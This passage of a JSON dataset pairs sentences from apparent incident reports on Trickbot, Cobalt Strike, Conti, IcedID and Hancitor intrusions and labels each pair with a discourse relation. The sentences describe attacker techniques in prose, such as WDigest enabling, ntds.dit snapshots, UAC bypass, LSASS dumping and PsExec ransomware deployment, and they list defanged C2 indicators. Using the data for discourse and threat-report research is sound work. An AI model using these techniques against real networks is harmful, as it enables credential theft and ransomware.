        "S2": "On the initial beachhead, various discovery commands were executed from the injected svchost.exe process.",
        "relation": "MISC"
    },
    {
        "S1": "As typically seen in Trickbot infections, it drops a copy of itself into this folder along with its encrypted config (settings.ini) and a batch file (launcher.bat).",
        "S2": "On the initial beachhead, various discovery commands were executed from the injected svchost.exe process.",
        "relation": "MISC"
    },
    {
        "S1": "As typically seen in Trickbot infections, it drops a copy of itself into this folder along with its encrypted config (settings.ini) and a batch file (launcher.bat).",
        "S2": "The launcher.bat file, which triggers the Trickbot executable, is set to start via a scheduled task:",
        "relation": "NEXT"
    },
    {
        "S1": "Trickbot utilized the same instance of wermgr.exe to load Cobalt Strike beacons into memory using PowerShell, which remained active throughout the intrusion:",
        "S2": "A diverse set of reconnaissance commands were also observed from the Cobalt Strike beacons:",
        "relation": "NEXT"
    },
    {
        "S1": "Trickbot utilized the same instance of wermgr.exe to load Cobalt Strike beacons into memory using PowerShell, which remained active throughout the intrusion:",
        "S2": "The launcher.bat file, which triggers the Trickbot executable, is set to start via a scheduled task:",
        "relation": "MISC"
    },
    {
        "S1": "The launcher.bat file, which triggers the Trickbot executable, is set to start via a scheduled task:",
        "S2": "To prepare for code injection, the Trickbot executable allocated memory in the address space of the Windows system process \u201cwermgr.exe\u201d (Windows Error Reporting Module).",
        "relation": "NEXT"
    },
    {
        "S1": "To prepare for code injection, the Trickbot executable allocated memory in the address space of the Windows system process \u201cwermgr.exe\u201d (Windows Error Reporting Module).",
        "S2": "The threat actor enabled WDigest authentication by changing the value of the \u201cUseLogonCredential\u201d object from 0 to 1 in the Windows registry.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor enabled WDigest authentication by changing the value of the \u201cUseLogonCredential\u201d object from 0 to 1 in the Windows registry.",
        "S2": "The threat actor made use of the Active Directory module to save hostname, OS and last logon date information of all AD Computer objects in a CSV file.",
        "relation": "MISC"
    },
    {
        "S1": "A diverse set of reconnaissance commands were also observed from the Cobalt Strike beacons:",
        "S2": "In this case, the threat actor did not bother to change the default pipe naming convention of Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor made use of the Active Directory module to save hostname, OS and last logon date information of all AD Computer objects in a CSV file.",
        "S2": "In this case, the threat actor did not bother to change the default pipe naming convention of Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "When the file is executed, it drops various files in the user\u2019s AppData directory, including \u201cfilepass.exe\u201d, which is started as a child process.",
        "S2": "Filepass.exe then loads an unsigned DLL named theora2.dll:",
        "relation": "NEXT"
    },
    {
        "S1": "In this case, the threat actor did not bother to change the default pipe naming convention of Cobalt Strike.",
        "S2": "From here, the CS stager used the WinInet API in an attempt to fetch a Cobalt Strike beacon hosted on windowsupdatesc[.]com.",
        "relation": "MISC"
    },
    {
        "S1": "From here, the CS stager used the WinInet API in an attempt to fetch a Cobalt Strike beacon hosted on windowsupdatesc[.]com.",
        "S2": "The initial Trickbot traffic can be seen in blue, followed by the Cobalt Strike traffic in red: https://tria.ge/210617-6hxwajevbs",
        "relation": "MISC"
    },
    {
        "S1": "In this intrusion, we observed a number of interesting techniques being leveraged by the threat actors.",
        "S2": "We have observed the same techniques in other intrusions and understanding these techniques will allow defenders to disrupt such intrusion activity and deny it in their own networks.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this intrusion, we observed a number of interesting techniques being leveraged by the threat actors.",
        "S2": "During the intrusion, this activity was seen multiple times, on multiple hosts.",
        "relation": "MISC"
    },
    {
        "S1": "The Conti operators chose to wait a couple days before ransoming the environment.",
        "S2": "The initial access method for that case was IcedID, which shows that the threat actors utilize various initial access methods to get into environments and accomplish their goals.",
        "relation": "MISC"
    },
    {
        "S1": "We have observed the same techniques in other intrusions and understanding these techniques will allow defenders to disrupt such intrusion activity and deny it in their own networks.",
        "S2": "We observed the threat actors having technical issues.",
        "relation": "MISC"
    },
    {
        "S1": "The Trickbot payload came from a phishing campaign associated with BazarCall, delivering weaponized XLSB files.",
        "S2": "Certutil was used to download and load the Trickbot DLL into memory.",
        "relation": "NEXT"
    },
    {
        "S1": "As part of further automated tasking, Trickbot performed an initial reconnaissance of the environment using native Windows tools such as nltest.exe and net.exe.",
        "S2": "Once access through Cobalt Strike was established, the threat actors immediately proceeded with domain enumeration via Nltest, AdFind, BloodHound, and PowerSploit.",
        "relation": "MISC"
    },
    {
        "S1": "As part of further automated tasking, Trickbot performed an initial reconnaissance of the environment using native Windows tools such as nltest.exe and net.exe.",
        "S2": "Psexec, with two separate batch files, were used to execute Conti ransomware on all domain-joined Windows hosts.",
        "relation": "NEXT"
    },
    {
        "S1": "First hands-on activity was observed two hours after initial compromise, when Trickbot downloaded and executed Cobalt Strike Beacons.",
        "S2": "One of the Cobalt Strike Beacons was the same payload and command and control infrastructure as used in a prior case.",
        "relation": "ELABORATION"
    },
    {
        "S1": "First hands-on activity was observed two hours after initial compromise, when Trickbot downloaded and executed Cobalt Strike Beacons.",
        "S2": "Once access through Cobalt Strike was established, the threat actors immediately proceeded with domain enumeration via Nltest, AdFind, BloodHound, and PowerSploit.",
        "relation": "NEXT"
    },
    {
        "S1": "First hands-on activity was observed two hours after initial compromise, when Trickbot downloaded and executed Cobalt Strike Beacons.",
        "S2": "Including copying the Windows CertUtil program and using that to collect further Trickbot payloads.",
        "relation": "NEXT"
    },
    {
        "S1": "To guarantee execution on the beachhead host, multiple payloads were used.",
        "S2": "Presence was then expanded on the beachhead by using a PowerShell loader to execute additional Beacons.",
        "relation": "MISC"
    },
    {
        "S1": "Once access through Cobalt Strike was established, the threat actors immediately proceeded with domain enumeration via Nltest, AdFind, BloodHound, and PowerSploit.",
        "S2": "We observed the threat actors having technical issues.",
        "relation": "MISC"
    },
    {
        "S1": "Once access through Cobalt Strike was established, the threat actors immediately proceeded with domain enumeration via Nltest, AdFind, BloodHound, and PowerSploit.",
        "S2": "Ten minutes after lateral movement, a PowerShell Cobalt Strike loader executed as a service on a server.",
        "relation": "MISC"
    },
    {
        "S1": "Presence was then expanded on the beachhead by using a PowerShell loader to execute additional Beacons.",
        "S2": "The execution took place from the beachhead using WMIC.",
        "relation": "MISC"
    },
    {
        "S1": "Presence was then expanded on the beachhead by using a PowerShell loader to execute additional Beacons.",
        "S2": "The threat actors then reran many of the same discovery techniques that were previously executed on the beachhead, including AdFind and BloodHound.",
        "relation": "MISC"
    },
    {
        "S1": "We observed the threat actors having technical issues.",
        "S2": "Fifteen minutes after domain enumeration, we observed successful lateral movement to two endpoints on the network.",
        "relation": "MISC"
    },
    {
        "S1": "We observed the threat actors having technical issues.",
        "S2": "Even though the execution was not successful, the threat actors kept trying, a total of eight times, until it finally worked.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Fifteen minutes after domain enumeration, we observed successful lateral movement to two endpoints on the network.",
        "S2": "We observed a second stage execution using regsvr32 to load a DLL from the user\u2019s AppData\\Local\\Temp folder.",
        "relation": "MISC"
    },
    {
        "S1": "Even though the execution was not successful, the threat actors kept trying, a total of eight times, until it finally worked.",
        "S2": "Almost four hours after initial execution, the threat actors pivoted to a domain controller using domain admin credentials and executed a Cobalt Strike Beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Almost four hours after initial execution, the threat actors pivoted to a domain controller using domain admin credentials and executed a Cobalt Strike Beacon.",
        "S2": "Two days later, the Cobalt Strike Beacon on the domain controller was once again actively engaged by the threat actors.",
        "relation": "NEXT"
    },
    {
        "S1": "Once they had domain controller access, ntdsutil was used to take a snapshot of \u201cntds.dit\u201d, saved under \u201cC:\\Perflogs\\1\u201d, for offline password hash extraction.",
        "S2": "The threat actors then reran many of the same discovery techniques that were previously executed on the beachhead, including AdFind and BloodHound.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors then reran many of the same discovery techniques that were previously executed on the beachhead, including AdFind and BloodHound.",
        "S2": "Two days later, the Cobalt Strike Beacon on the domain controller was once again actively engaged by the threat actors.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors then reran many of the same discovery techniques that were previously executed on the beachhead, including AdFind and BloodHound.",
        "S2": "On the beachhead, multiple executables were saved in a temp directory and then pushed into memory by TrickBot process \u201cwermgr.exe\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "Two days later, the Cobalt Strike Beacon on the domain controller was once again actively engaged by the threat actors.",
        "S2": "From the point the threat actors returned, to ransom deployment, it was less than 30 minutes.",
        "relation": "NEXT"
    },
    {
        "S1": "From the point the threat actors returned, to ransom deployment, it was less than 30 minutes.",
        "S2": "An indication that the threat actors were keeping C2 channels independent from payload delivery/retrieval.",
        "relation": "MISC"
    },
    {
        "S1": "This would give defenders little time to act if they had not identified and contained the activity from the first day of the Trickbot infection.",
        "S2": "The execution took place from the beachhead using WMIC.",
        "relation": "MISC"
    },
    {
        "S1": "Including copying the Windows CertUtil program and using that to collect further Trickbot payloads.",
        "S2": "On the beachhead, multiple executables were saved in a temp directory and then pushed into memory by TrickBot process \u201cwermgr.exe\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "We observed a second stage execution using regsvr32 to load a DLL from the user\u2019s AppData\\Local\\Temp folder.",
        "S2": "We observed several attempts by the threat actor trying to escalate to SYSTEM \u2013 ultimately succeeding, as evident in several new services running under the Local SYSTEM context:",
        "relation": "MISC"
    },
    {
        "S1": "On the beachhead, multiple executables were saved in a temp directory and then pushed into memory by TrickBot process \u201cwermgr.exe\u201d.",
        "S2": "The execution took place from the beachhead using WMIC.",
        "relation": "MISC"
    },
    {
        "S1": "On the beachhead, multiple executables were saved in a temp directory and then pushed into memory by TrickBot process \u201cwermgr.exe\u201d.",
        "S2": "Trickbot made extensive use of process injection to hide in benign operating system processes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The executables were identified as Cobalt Strike and communicated over port 443 to C2 88.80.147[.]101.",
        "S2": "Named pipe impersonation was used to escalate to SYSTEM privileges \u2013 a common Cobalt Strike capability:",
        "relation": "MISC"
    },
    {
        "S1": "Named pipe impersonation was used to escalate to SYSTEM privileges \u2013 a common Cobalt Strike capability:",
        "S2": "Another defense evasion technique employed by Cobalt Strike, was to disable Windows Defender.",
        "relation": "LIST"
    },
    {
        "S1": "We observed several attempts by the threat actor trying to escalate to SYSTEM \u2013 ultimately succeeding, as evident in several new services running under the Local SYSTEM context:",
        "S2": "As part of the discovery stage, we observed data being exfiltrated.",
        "relation": "MISC"
    },
    {
        "S1": "Trickbot made extensive use of process injection to hide in benign operating system processes.",
        "S2": "Trickbot made use of esentutl to gather MSEdge history, webcache, and saved passwords using TrickBot\u2019s \u201cpwgrab\u201d module.",
        "relation": "MISC"
    },
    {
        "S1": "Another defense evasion technique employed by Cobalt Strike, was to disable Windows Defender.",
        "S2": "On the beachhead, Cobalt Strike executed BloodHound in memory.",
        "relation": "MISC"
    },
    {
        "S1": "WMIC was used to remotely execute \u2018def.bat\u2019.",
        "S2": "From the beachhead, WMIC was used to remotely execute \u2018165.bat\u2019 on two other hosts.",
        "relation": "LIST"
    },
    {
        "S1": "The execution took place from the beachhead using WMIC.",
        "S2": "AdFind.exe and adf.bat were uploaded to the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "The execution took place from the beachhead using WMIC.",
        "S2": "This activity occurred twice.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This activity occurred twice.",
        "S2": "During the intrusion, this activity was seen multiple times, on multiple hosts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "AdFind.exe and adf.bat were uploaded to the beachhead.",
        "S2": "On the beachhead, Cobalt Strike executed BloodHound in memory.",
        "relation": "MISC"
    },
    {
        "S1": "AdFind.exe and adf.bat were uploaded to the beachhead.",
        "S2": "AdFind results were written to the following locations:",
        "relation": "NEXT"
    },
    {
        "S1": "On the beachhead, Cobalt Strike executed BloodHound in memory.",
        "S2": "Multiple failed attempts were observed prior to the successful execution of a PowerShell Cobalt Strike loader via a service with \u201cSYSTEM\u201d privileges.",
        "relation": "MISC"
    },
    {
        "S1": "On the beachhead, Cobalt Strike executed BloodHound in memory.",
        "S2": "BloodHound was later executed on the domain controller as well.",
        "relation": "NEXT"
    },
    {
        "S1": "On the beachhead, Cobalt Strike executed BloodHound in memory.",
        "S2": "From the beachhead, WMIC was used to remotely execute \u2018165.bat\u2019 on two other hosts.",
        "relation": "MISC"
    },
    {
        "S1": "The results were saved in:",
        "S2": "Once again the results were stored in:",
        "relation": "ELABORATION"
    },
    {
        "S1": "BloodHound was later executed on the domain controller as well.",
        "S2": "An encoded PowerShell command was executed on the domain controller to enumerate all AD joined hosts and save the results to:",
        "relation": "MISC"
    },
    {
        "S1": "From the beachhead, WMIC was used to remotely execute \u2018165.bat\u2019 on two other hosts.",
        "S2": "The beachhead had multiple C2 channels, two of which were unique.",
        "relation": "MISC"
    },
    {
        "S1": "Decoded Cobalt Strike shellcode, using Cyber Chef recipe: https://github.com/mattnotmax/cyberchef-recipes#recipe-28\u2014de-obfuscation-of-cobalt-strike-beacon-using-conditional-jumps-to-obtain-shellcode",
        "S2": "Persistent C2 activity was Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "Persistent C2 activity was Cobalt Strike.",
        "S2": "The two persistent C2 channels were analyzed to determine the Cobalt Strike configuration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "An indication that the threat actors were keeping C2 channels independent from payload delivery/retrieval.",
        "S2": "When, the threat actors returned two days later, the final payloads were staged by the threat actors on a domain controller in the following location:",
        "relation": "MISC"
    },
    {
        "S1": "When, the threat actors returned two days later, the final payloads were staged by the threat actors on a domain controller in the following location:",
        "S2": "The second was \u201c_EXE.bat\u201d, to execute the staged CONTI payloads.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Two batch scripts were executed on the domain controller to automate ransomware deployment via PSExec.",
        "S2": "The batch scripts ran as expected a set of copy commands and then executed the Conti payload using psexec.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first was \u201c_COPY.bat\u201d, to stage the CONTI ransomware payload on all domain-joined computers.",
        "S2": "The batch scripts ran as expected a set of copy commands and then executed the Conti payload using psexec.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Our intrusion starts when a malicious Word document is executed that drops and executes an HTA file.",
        "S2": "Service Execution (T1569.002) via Cobalt Strike Beacon was used throughout the intrusion for privilege escalation.",
        "relation": "NEXT"
    },
    {
        "S1": "This HTA file is used to download IcedID in the form of a JPG file.",
        "S2": "IcedID downloads some 2nd stage payloads and loads the DLL into memory with rundll32 (miubeptk2.dll \u2013 IcedID \u2013 used for persistence) and regsvr32 (ekix4.dll \u2013 Cobalt Strike beacon \u2013 privilege escalation via fodhelper) to pillage the domain.",
        "relation": "NEXT"
    },
    {
        "S1": "This file is actually a Windows DLL file, which is executed via regsvr32 (1st stage IcedID).",
        "S2": "This file\u2019s extension is misleading as the file is a Windows DLL.",
        "relation": "ELABORATION"
    },
    {
        "S1": "IcedID downloads some 2nd stage payloads and loads the DLL into memory with rundll32 (miubeptk2.dll \u2013 IcedID \u2013 used for persistence) and regsvr32 (ekix4.dll \u2013 Cobalt Strike beacon \u2013 privilege escalation via fodhelper) to pillage the domain.",
        "S2": "Command and Control was achieved via IcedID and Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "Service Execution (T1569.002) via Cobalt Strike Beacon was used throughout the intrusion for privilege escalation.",
        "S2": "Initial access for this intrusion was via a malicious attachment \u201corder 06.21.doc\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "There were numerous attempts at lateral movement via Cobalt Strike beacons, with limited success.",
        "S2": "On day eleven, a new Cobalt Strike infrastructure was introduced to the environment with the threat actor displaying new techniques that were successful in moving laterally, where the initial activity failed.",
        "relation": "NEXT"
    },
    {
        "S1": "Ultimately, the threat actors were unsuccessful when AV snagged their attempts to move to certain servers.",
        "S2": "After the initial compromise, the threat actors went silent for eleven days.",
        "relation": "MISC"
    },
    {
        "S1": "On day eleven, a new Cobalt Strike infrastructure was introduced to the environment with the threat actor displaying new techniques that were successful in moving laterally, where the initial activity failed.",
        "S2": "IcedID executes via rundll32, dropping DLL files related to both the IcedID second stage and Cobalt Strike beacons.",
        "relation": "MISC"
    },
    {
        "S1": "This may indicate a hand off to a new group, or the original actor may have returned, either way, we did not see a final action on objectives.",
        "S2": "Lateral Movement chain #1 \u2013 The attacker was able to successfully move from workstation #1 to workstation #2 via service execution.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access for this intrusion was via a malicious attachment \u201corder 06.21.doc\u201d.",
        "S2": "After the initial compromise, the threat actors went silent for eleven days.",
        "relation": "NEXT"
    },
    {
        "S1": "IcedID executes via rundll32, dropping DLL files related to both the IcedID second stage and Cobalt Strike beacons.",
        "S2": "After that period of time, a new Cobalt Strike beacon was run through IcedID and sent forth to a second phase of their activities.",
        "relation": "MISC"
    },
    {
        "S1": "After that period of time, a new Cobalt Strike beacon was run through IcedID and sent forth to a second phase of their activities.",
        "S2": "GetSystem was also used by the threat actors.",
        "relation": "MISC"
    },
    {
        "S1": "After that period of time, a new Cobalt Strike beacon was run through IcedID and sent forth to a second phase of their activities.",
        "S2": "Ekix4.dll, a Cobalt Strike payload was executed via fodhelper UAC bypass.",
        "relation": "MISC"
    },
    {
        "S1": "IcedID establishes persistence on the compromised host using a scheduled task named \u2018{0AC9D96E-050C-56DB-87FA-955301D93AB5}\u2019 that executes its second stage.",
        "S2": "IcedID initially performed some discovery of the local system and the domain.",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike payloads were used to escalate privileges to SYSTEM via a service created to run a payload using rundll32.exe as the LocalSystem user.",
        "S2": "Using these credentials, the threat actors attempted to use a Cobalt Strike beacon injected into the LSASS process to execute WMIC, which executed ProcDump on a remote system to dump credentials.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors were seen using overpass the hash to elevate privileges in the Active Directory environment via Mimikatz style pass the hash logon events, followed by subsequent suspect Kerberos ticket requests matching network alert signatures.",
        "S2": "Using these credentials, the threat actors attempted to use a Cobalt Strike beacon injected into the LSASS process to execute WMIC, which executed ProcDump on a remote system to dump credentials.",
        "relation": "MISC"
    },
    {
        "S1": "Using these credentials, the threat actors attempted to use a Cobalt Strike beacon injected into the LSASS process to execute WMIC, which executed ProcDump on a remote system to dump credentials.",
        "S2": "Later, Cobalt Strike beacons were used to perform discovery of the system and domain.",
        "relation": "MISC"
    },
    {
        "S1": "IcedID initially performed some discovery of the local system and the domain.",
        "S2": "The logs demonstrate multiple connections from IcedID to their C2 servers, including aws.amazon[.]com for connectivity checks.",
        "relation": "MISC"
    },
    {
        "S1": "Later, Cobalt Strike beacons were used to perform discovery of the system and domain.",
        "S2": "The Cobalt Strike beacons also make use of multiple C2 servers on the public internet.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Later, Cobalt Strike beacons were used to perform discovery of the system and domain.",
        "S2": "The Cobalt Strike beacon itself was used as a proxy to connect and retrieve the PowerView file.",
        "relation": "MISC"
    },
    {
        "S1": "The following shows the decoded PowerShell commands used by Cobalt Strike to perform discovery.",
        "S2": "The attacker tried to replicate this movement technique towards two servers but were stopped when their Cobalt Strike PowerShell payloads were nabbed by AV.",
        "relation": "MISC"
    },
    {
        "S1": "Lateral Movement chain #1 \u2013 The attacker was able to successfully move from workstation #1 to workstation #2 via service execution.",
        "S2": "Lateral Movement chain #2 \u2013 Another attempt was made to move from workstation #1 to one of the servers, but this attempt was also thwarted by AV.",
        "relation": "LIST"
    },
    {
        "S1": "The attacker tried to replicate this movement technique towards two servers but were stopped when their Cobalt Strike PowerShell payloads were nabbed by AV.",
        "S2": "Lateral Movement chain #3 \u2013 Privileges were escalated to SYSTEM on Workstation #1 via the Cobalt Strike \u2018GetSystem\u2019 command which makes use of named pipes.",
        "relation": "MISC"
    },
    {
        "S1": "Lateral Movement chain #2 \u2013 Another attempt was made to move from workstation #1 to one of the servers, but this attempt was also thwarted by AV.",
        "S2": "Lateral Movement chain #3 \u2013 Privileges were escalated to SYSTEM on Workstation #1 via the Cobalt Strike \u2018GetSystem\u2019 command which makes use of named pipes.",
        "relation": "LIST"
    },
    {
        "S1": "A Cobalt Strike DLL was copied to a server and executed using WMI.",
        "S2": "The Cobalt Strike beacons also make use of multiple C2 servers on the public internet.",
        "relation": "MISC"
    },
    {
        "S1": "In this short intrusion, the threat actor gained initial access on a system through a maldoc campaign which made use of the Hancitor downloader.",
        "S2": "After about 20 minutes, the threat actor copied a batch script file and DLL file to another system using the SMB protocol.",
        "relation": "NEXT"
    },
    {
        "S1": "In this short intrusion, the threat actor gained initial access on a system through a maldoc campaign which made use of the Hancitor downloader.",
        "S2": "Later on in the intrusion, the threat actor used the following command to execute a Cobalt Strike Beacon on another machine:",
        "relation": "NEXT"
    },
    {
        "S1": "The first-stage DLL, which was dropped by a malicious Word document, attempted to download multiple malware payloads on the beachhead system, including Ficker Stealer.",
        "S2": "The Hancitor malware was embedded in a macro-based Word document.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first-stage DLL, which was dropped by a malicious Word document, attempted to download multiple malware payloads on the beachhead system, including Ficker Stealer.",
        "S2": "On the beachhead system, the malicious Hancitor DLL injected into the svchost.exe process.",
        "relation": "MISC"
    },
    {
        "S1": "In addition, a Cobalt Strike beacon payload was downloaded, and deployed to perform post-exploitation activities.",
        "S2": "A remote service was installed to start the batch file, which executed the Cobalt Strike shellcode-embedded DLL.",
        "relation": "MISC"
    },
    {
        "S1": "After about 20 minutes, the threat actor copied a batch script file and DLL file to another system using the SMB protocol.",
        "S2": "Later on in the intrusion, the threat actor used the following command to execute a Cobalt Strike Beacon on another machine:",
        "relation": "MISC"
    },
    {
        "S1": "A remote service was installed to start the batch file, which executed the Cobalt Strike shellcode-embedded DLL.",
        "S2": "The svchost.exe process, in turn, injected a Cobalt Strike beacon into multiple rundll32.exe instances.",
        "relation": "MISC"
    },
    {
        "S1": "The Hancitor malware was embedded in a macro-based Word document.",
        "S2": "When the macro was enabled, the infection chain started, and the first-stage Hancitor DLL was dropped to disk.",
        "relation": "NEXT"
    },
    {
        "S1": "This single-paged document contained a picture with instructions, attempting to lure the victim into enabling macros.",
        "S2": "Reviewing the macro we can see that in sub yyy (towards the bottom) content within the document is being copied and used to create a file object by sub xxx which then is executed by the shell call to rundll32.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When the macro was enabled, the infection chain started, and the first-stage Hancitor DLL was dropped to disk.",
        "S2": "The malicious Hancitor DLL in the OLE object, named \u201crem.r\u201d, was executed via rundll32.exe by passing the entry point \u201cESLMJYVFM\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "The malicious Hancitor DLL in the OLE object, named \u201crem.r\u201d, was executed via rundll32.exe by passing the entry point \u201cESLMJYVFM\u201d.",
        "S2": "On the beachhead system, the malicious Hancitor DLL injected into the svchost.exe process.",
        "relation": "MISC"
    },
    {
        "S1": "Later on in the intrusion, the threat actor used the following command to execute a Cobalt Strike Beacon on another machine:",
        "S2": "On the beachhead system, the threat actor started exploring their options to move laterally within the target network.",
        "relation": "MISC"
    },
    {
        "S1": "On the beachhead system, the malicious Hancitor DLL injected into the svchost.exe process.",
        "S2": "On the beachhead system, the threat actor started exploring their options to move laterally within the target network.",
        "relation": "MISC"
    },
    {
        "S1": "The code was injected into multiple instances of svchost.exe.",
        "S2": "The svchost.exe process, in turn, injected a Cobalt Strike beacon into multiple rundll32.exe instances.",
        "relation": "NEXT"
    },
    {
        "S1": "The code was injected into multiple instances of svchost.exe.",
        "S2": "For one specific system, for which the threat actor showed interest, the contents of the C$ share was listed\u2013we assess, to verify if the account had access permissions to the share before copying the malware to it:",
        "relation": "MISC"
    },
    {
        "S1": "The svchost.exe process, in turn, injected a Cobalt Strike beacon into multiple rundll32.exe instances.",
        "S2": "Packet analysis to the IP address mentioned above, shows that it\u2019s downloading the Cobalt Strike beacon by initiating a HTTP GET request to /hVVH URI.",
        "relation": "MISC"
    },
    {
        "S1": "One of the injected rundll32.exe instance was also observed connecting to the Cobalt Strike C2 server.",
        "S2": "The DLL contains the Cobalt Strike shellcode and will only execute if the \u201c11985756\u201d parameter is passed to the TstSec function.",
        "relation": "MISC"
    },
    {
        "S1": "After extracting the Cobalt Strike shellcode from 95.dll and emulating it via scdbg, we found that it\u2019s connecting to 162.244.83[.]95 over port 8080.",
        "S2": "Packet analysis to the IP address mentioned above, shows that it\u2019s downloading the Cobalt Strike beacon by initiating a HTTP GET request to /hVVH URI.",
        "relation": "MISC"
    },
    {
        "S1": "On the beachhead system, the threat actor started exploring their options to move laterally within the target network.",
        "S2": "For one specific system, for which the threat actor showed interest, the contents of the C$ share was listed\u2013we assess, to verify if the account had access permissions to the share before copying the malware to it:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor also pinged one of the Active Directory domain controllers from the beachhead machine.",
        "S2": "On the second system, to which the adversary laterally moved (see section below), the following discovery commands were executed:",
        "relation": "MISC"
    },
    {
        "S1": "A high amount of ICMP traffic, targeting various Class-A subnets ranges, was observed and used to identify other active systems within the environment.",
        "S2": "Both files were copied to the ProgramData folder of another system within the environment.",
        "relation": "MISC"
    },
    {
        "S1": "On the second system, to which the adversary laterally moved (see section below), the following discovery commands were executed:",
        "S2": "To execute the batch file, the threat actor installed, and started, a remote service on the other system.",
        "relation": "MISC"
    },
    {
        "S1": "The injected svchost process dropped two files: a batch-file named: \u201c95.bat\u201d and a DLL-file named: \u201c95.dll\u201d.",
        "S2": "The content of the batch file can be seen below\u2013it executes the transferred DLL and then deletes itself:",
        "relation": "NEXT"
    },
    {
        "S1": "In the network traffic, we can identify a data stream pattern that is distinctive to Hancitor malware.",
        "S2": "This was followed by Hancitor C2 traffic, sent via HTTP POST requests, which included unique attributes of the infected system, such as hostname and username information (2).",
        "relation": "NEXT"
    },
    {
        "S1": "Hancitor then attempted to download additional malware.",
        "S2": "Hancitor also attempted to download Cobalt Strike stagers (.bin files) (3), and Cobalt Strike traffic was sent both encrypted and unencrypted (5).",
        "relation": "LIST"
    },
    {
        "S1": "We assess with medium confidence that the initial IcedID infection was delivered via a malspam campaign, which included an attachment with a password protected zip archive.",
        "S2": "Discovered in 2017, what started as a commodity malware, IcedID is now currently being deployed as an initial access broker by ransomware threat actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We assess with medium confidence that the initial IcedID infection was delivered via a malspam campaign, which included an attachment with a password protected zip archive.",
        "S2": "Five minutes after the above discovery activity, we observed the actors moving laterally to other hosts on the network with the credentials of a domain administrator account.",
        "relation": "NEXT"
    },
    {
        "S1": "We assess with medium confidence that the initial IcedID infection was delivered via a malspam campaign, which included an attachment with a password protected zip archive.",
        "S2": "Within 35 minutes after the initial infection, they made their way in to the network via a Cobalt Strike Beacon deployed from the IcedID infected host.",
        "relation": "NEXT"
    },
    {
        "S1": "Discovered in 2017, what started as a commodity malware, IcedID is now currently being deployed as an initial access broker by ransomware threat actors.",
        "S2": "Within 35 minutes after the initial infection, they made their way in to the network via a Cobalt Strike Beacon deployed from the IcedID infected host.",
        "relation": "MISC"
    },
    {
        "S1": "Within 35 minutes after the initial infection, they made their way in to the network via a Cobalt Strike Beacon deployed from the IcedID infected host.",
        "S2": "In this case, Cobalt Strike was also used to create the administrative token, and attempted to install a service using a windows service executable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Within 35 minutes after the initial infection, they made their way in to the network via a Cobalt Strike Beacon deployed from the IcedID infected host.",
        "S2": "Discovery commands were run by IcedID during the initial execution on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "Within 35 minutes after the initial infection, they made their way in to the network via a Cobalt Strike Beacon deployed from the IcedID infected host.",
        "S2": "The service was tasked to run an encoded PowerShell command which would download and execute the Cobalt Strike beacon over HTTP.",
        "relation": "MISC"
    },
    {
        "S1": "Within 35 minutes after the initial infection, they made their way in to the network via a Cobalt Strike Beacon deployed from the IcedID infected host.",
        "S2": "The first stage of the IcedID malware that was executed on the host was dropped via a macro enabled Word document \u2013 as seen by Unit42.",
        "relation": "MISC"
    },
    {
        "S1": "The first task of the threat actor was to enumerate the network by establishing a list of the domain admins using living off the land techniques, such as net.exe.",
        "S2": "The threat actor was also observed stealing credentials from the lsass.exe process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first task of the threat actor was to enumerate the network by establishing a list of the domain admins using living off the land techniques, such as net.exe.",
        "S2": "Five minutes after the above discovery activity, we observed the actors moving laterally to other hosts on the network with the credentials of a domain administrator account.",
        "relation": "NEXT"
    },
    {
        "S1": "A freely available tool Adfind.exe was also utilized to further enumerate the domain.",
        "S2": "Based on the name of the hosts that the threat actors decided to pivot, we judge that they were able to digest the \u2018AdFind\u2019 results and focus on, what they believed to be, important targets \u2013 critical assets such as file servers, domain controllers, etc.",
        "relation": "NEXT"
    },
    {
        "S1": "Five minutes after the above discovery activity, we observed the actors moving laterally to other hosts on the network with the credentials of a domain administrator account.",
        "S2": "It is also worth mentioning that even after the unsuccessful remote execution attempt against a few servers due to AV, the actors decided to connect via RDP and spend over an hour looking for valuable data before disconnecting and leaving the network.",
        "relation": "MISC"
    },
    {
        "S1": "Five minutes after the above discovery activity, we observed the actors moving laterally to other hosts on the network with the credentials of a domain administrator account.",
        "S2": "Based on the name of the hosts that the threat actors decided to pivot, we judge that they were able to digest the \u2018AdFind\u2019 results and focus on, what they believed to be, important targets \u2013 critical assets such as file servers, domain controllers, etc.",
        "relation": "MISC"
    },
    {
        "S1": "Five minutes after the above discovery activity, we observed the actors moving laterally to other hosts on the network with the credentials of a domain administrator account.",
        "S2": "This is not the first time we have observed this process (wuauclt.exe) being used.",
        "relation": "MISC"
    },
    {
        "S1": "Based on the name of the hosts that the threat actors decided to pivot, we judge that they were able to digest the \u2018AdFind\u2019 results and focus on, what they believed to be, important targets \u2013 critical assets such as file servers, domain controllers, etc.",
